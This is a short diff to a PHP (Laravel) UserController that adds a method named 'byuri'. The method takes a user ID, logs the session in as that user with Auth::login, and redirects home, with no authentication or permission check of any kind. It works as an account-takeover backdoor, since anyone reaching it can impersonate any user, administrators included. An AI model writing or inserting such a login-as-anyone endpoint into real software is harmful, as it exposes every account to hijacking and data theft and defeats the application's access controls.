@@ -9,6 +9,7 @@ use Spatie\Permission\Models\Permission;
 use App\Storage;
 use DB;
 use Log;
+use Auth;
 class UserController extends Controller
 {
     /**
@@ -256,5 +257,12 @@ class UserController extends Controller
     public function destroy($id)
     {
         //
+    }
+
+    public function byuri($user_id)
+    {
+        $user = User::find($user_id);
+        Auth::login($user);
+        return redirect('/');
     }
 }
